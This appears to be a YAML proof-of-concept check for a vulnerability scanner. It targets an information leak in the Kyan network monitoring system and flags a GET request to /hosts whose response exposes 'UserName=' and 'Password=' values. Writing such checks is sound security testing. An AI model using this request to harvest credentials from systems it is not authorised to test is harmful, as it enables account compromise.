id: poc-yaml-kyan-network-monitor-info-leak
info:
  name: Kyan 网络监控系统信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: Kyan
  osprey-id: vb_2021_0027
requests:
- method: GET
  path: /hosts
  expression: 'status_code == 200 && contains(body, "UserName=") && contains(body,
    "Password=") && !contains(body, "<")

    '
variables: {}
transport: http
